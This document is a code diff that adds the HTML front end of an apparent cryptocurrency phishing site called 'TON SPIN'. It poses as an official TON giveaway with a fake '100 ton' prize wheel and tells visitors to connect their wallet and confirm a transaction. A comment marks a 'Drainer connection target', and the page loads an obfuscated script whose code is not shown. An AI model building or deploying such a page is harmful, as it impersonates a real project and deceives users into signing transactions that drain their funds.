@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="Description" content="Claim your free spin and win rewards with TON Spin! Connect your wallet and join the fun." />
+
+    <link rel="icon" href="./assets/favicon.ico" />
+    <link rel="stylesheet" href="./assets/css/style.css" />
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@200..800&display=swap" rel="stylesheet" />
+
+    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js" crossorigin="anonymous"></script>
+
+    <title>TON SPIN</title>
+</head>
+
+<body>
+
+    <div class="modal">
+        <div class="modal_rect">
+            <div class="modal_rect_up">
+                <p class="modal_rect_up_tittle">CONGRATULATIONS! <br> you have won <span>100 ton</span></p>
+            </div>
+            <div class="modal_rect_bottom">
+                <div class="modal_rect_bottom_content">
+                    <p class="modal_rect_bottom_text">Join us to claim reward</p>
+                    <button class="btn-go modal_rect_bottom_button">CLAIM REWARD</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <section class="header">
+        <div class="container">
+            <div class="header_items">
+                <div class="header_item">
+                    <a href="#!" onclick="document.location.hash='!';return false;" class="header_item_logo"><img
+                            src="./assets/img/header_logo.svg" alt=""></a>
+                </div>
+                <div class="header_item">
+                    <div class="header_item_socials">
+                        <a href="https://twitter.com/ton_blockchain" target="_blank" class="header_item_social"><img
+                                src="./assets/img/header_twitter.svg" alt=""></a>
+                        <a href="https://youtube.com/@the_open_network?si=1C27q9XJIvpuNG1u" target="_blank"
+                            class="header_item_social"><img src="./assets/img/header_yt.svg" alt=""></a>
+                        <a href="https://t.me/tonblockchain" target="_blank" class="header_item_social"><img
+                                src="./assets/img/header_tg.svg" alt=""></a>
+                        <a href="/cdn-cgi/l/email-protection#33435241475d5641405b5a4373475c5d1d5c4154"
+                            class="header_item_social"><img src="./assets/img/header_mail.svg" alt=""></a>
+                    </div>
+                </div>
+                <div class="header_item">
+                    <button class="btn-go header_item_button">Connect Wallet <img
+                            src="./assets/img/header_arrow.svg" alt=""></button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="main">
+        <div class="container">
+            <h1 class="main_tittle">Welcome <span>bonus</span> <br> for ton users</h1>
+
+            <div class="main_wheel">
+                <div class="main_wheel_main">
+                    <img src="./assets/img/wheel_arrow.png" alt="" class="main_wheel_main_arrow">
+                    <img src="./assets/img/wheel_wheel.png" alt="" class="main_wheel_main_wheel" id="wheel">
+                    <button class="btn-go main_wheel_main_button" id="spin-button">FREE SPIN</button>
+                </div>
+            </div>
+
+            <div class="main_faq">
+                <div class="main_faq_blocks">
+                    <p class="main_faq_block"><img src="./assets/img/main_one.svg" alt="">If you have received a
+                        qualification notification in the form of NFT or USDT, click the button «FREE SPIN»</p>
+                    <p class="main_faq_block"><img src="./assets/img/main_two.svg" alt="">If you win reward in free
+                        spin, we congratulate you!</p>
+                    <p class="main_faq_block"><img src="./assets/img/main_three.svg" alt="">Click «CLAIM REWARD»,
+                        connect your wallet and confirm in wallet received transaction</p>
+                </div>
+                <p class="main_faq_copy">Copyright © 2024 TON. All Rights Reserved</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Drainer connection target -->
+    <div id="connect-btn"></div>
+
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    <script src="./assets/js/spin-wheel-obfuscated.js"></script>
+    <script src="./assets/js/vendor.min.js"></script>
+    <script src="./assets/js/web3.js"></script>
+</body>
+
+</html>
